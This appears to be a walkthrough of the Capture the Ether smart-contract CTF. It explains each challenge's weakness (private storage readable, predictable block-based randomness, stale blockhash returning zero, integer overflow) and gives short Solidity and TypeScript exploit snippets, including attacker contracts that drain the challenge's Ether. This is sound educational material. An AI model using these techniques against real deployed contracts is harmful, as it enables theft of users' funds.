## Warmup

### Deploy a contract

1. Install a wallet
2. Get some ETH from a faucet
3. Deploy the contract from the web page

### Call me

Just call the `callme` function.

```typescript
const tx = await contract.callme();
```

[Script](./scripts/warmup/CallMeChallenge.ts) | [Test](./test/warmup/CallMeChallenge.spec.ts)

### Choose a nickname

Call the `setNickname` function with your nickname.

The function expects the input to be a `bytes32`, so you should parse the name before sending it.

```typescript
const nickname = ethers.utils.formatBytes32String("juancito");
const tx = await contract.setNickname(nickname);
```

[Script](./scripts/warmup/NicknameChallenge.ts)

## Lotteries

### Guess the number

Call the `guess` function with the `answer` number `42` which is hardcoded in the contract

```typescript
const tx = await contract.guess(42, { value: utils.parseEther("1") });
```

[Script](./scripts/lotteries/GuessTheNumberChallenge.ts) | [Test](./test/lotteries/GuessTheNumberChallenge.spec.ts)

### Guess the secret number

The answer `n` is now a number that produces a specific `answerHash` which is not reversible

```solidity
bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

function guess(uint8 n) public payable {
    require(msg.value == 1 ether);

    if (keccak256(n) == answerHash) {
        msg.sender.transfer(2 ether);
    }
}
```

The good thing is that the answer is defined as `uint8 n`, which has a range from 0 to 255. We can brute force it until we get the specific hash.

```typescript
for (let i = 0; i <= 255; i++) {
  const hash = utils.keccak256([i]);
  if (answerHash === hash) {
    secretNumber = i;
    console.log(`The secret number is ${secretNumber}`);
    break;
  }
}
```

[Script](./scripts/lotteries/GuessTheSecretNumberChallenge.ts) | [Test](./test/lotteries/GuessTheSecretNumberChallenge.spec.ts)

### Guess the random number

In this case the answer is generated "randomly" and stored "privately" in the contract:

```solidity
contract GuessTheRandomNumberChallenge {
  uint8 answer;

  function GuessTheRandomNumberChallenge() public payable {
    answer = uint8(keccak256(block.blockhash(block.number - 1), now));
  }
}

```

Data in smart contracts can be read despite being declared as "private". The key here is to understand how the storage works, and that the `answer` is stored in `slot 0` and therefore can be retrieved by calling:

```typescript
const secretNumber = await contract.provider.getStorageAt(contract.address, 0);
```

[Script](./scripts/lotteries/GuessTheRandomNumberChallenge.ts) | [Test](./test/lotteries/GuessTheRandomNumberChallenge.spec.ts)

### Guess the new number

The answer is now a "random" number:

```solidity
function guess(uint8 n) public payable {
  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
}

```

The EVM is deterministic, so it is not possible to achieve randomness inside it. Given the same inputs, it will output the same result, and we can explot this.

We can create a new contract that calculates the answer and calls the original contract with it. That way we can make sure that the "random" number is generated on the same block, and we can win every time.

```solidity
uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
challenge.guess.value(1 ether)(answer);
```

You will also need to let the attacker contract receive Ether:

```solidity
function() public payable {}

```

And don't forget to transfer the Ether from the attacker contract to your address (or create a withdraw function only callable by you) üí∏

[Script](./scripts/lotteries/GuessTheNewNumberChallenge.ts) | [Test](./test/lotteries/GuessTheNewNumberChallenge.spec.ts)

### Predict the future

The guess answer now has to be set beforehand, and then settled on a new tx, as it requires to be on a future block

```solidity
function lockInGuess(uint8 n) public payable {
  guess = n;
  settlementBlockNumber = block.number + 1;
}

function settle() public {
  require(block.number > settlementBlockNumber);
  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
}

```

The "random" answer can _only_ be a number between `0-9` because of the `% 10`.

With this in mind we can exploit it:

1. Call `lockInGuess` with any number `0-9`
2. Create an attacker contract that calculates when that number is equal to the answer
3. Call `settle` from the attack contract only if it equals our initial random guess

This way we only bet when we know we will win :)

```solidity
function lockInGuess() public payable {
  challenge.lockInGuess.value(1 ether)(0); // Guess will be 0
}

function attack() public {
  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
  require(answer == 0); // Put your guess here

  challenge.settle();
  msg.sender.transfer(address(this).balance);
}

```

[Script](./scripts/lotteries/PredictTheFutureChallenge.ts) | [Test](./test/lotteries/PredictTheFutureChallenge.spec.ts)

### Predict the block hash

We now have to predict the hash of a future block, which will not be possible to brute-force:

```solidity
function lockInGuess(bytes32 hash) public payable {
  guess = hash;
  settlementBlockNumber = block.number + 1;
}

function settle() public {
  require(block.number > settlementBlockNumber);
  bytes32 answer = block.blockhash(settlementBlockNumber);
}

```

But there is a catch! From [Solidity documentation](https://docs.soliditylang.org/en/v0.6.8/units-and-global-variables.html#block-and-transaction-properties):

> The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero.

This means that after 256 + 1 blocks of locking our guess our "random" answer will be 0. So we we can exploit it:

1. Call `lockInGuess` with `0x0000000000000000000000000000000000000000000000000000000000000000`
2. Wait for 257 blocks
3. Call `settle`

## Math

### Token sale

The goal here is to steal some Ether from the contract.

In older versions of Solidity you could perform an overflow without reverting the tx. This [was changed in v0.8.0](https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html#silent-changes-of-the-semantics).

It is possible to exploit the contract with that in mind tricking the `require`:

```solidity
function buy(uint256 numTokens) public payable {
  require(msg.value == numTokens * PRICE_PER_TOKEN);

  balanceOf[msg.sender] += numTokens;
}

```

We can calculate the value of `numTokens` that makes the calculation overflow, and the amount of wei that has to be sent:

```solidity
numTokens = MAX_UNIT_256 / PRICE_PER_TOKEN + 1;
msg.value = numTokens - MAX_UNIT_256;
```

The resulting `msg.value` is around `0.41` ETH. Then, 1 token can be sold for 1 ETH, completing the challenge.
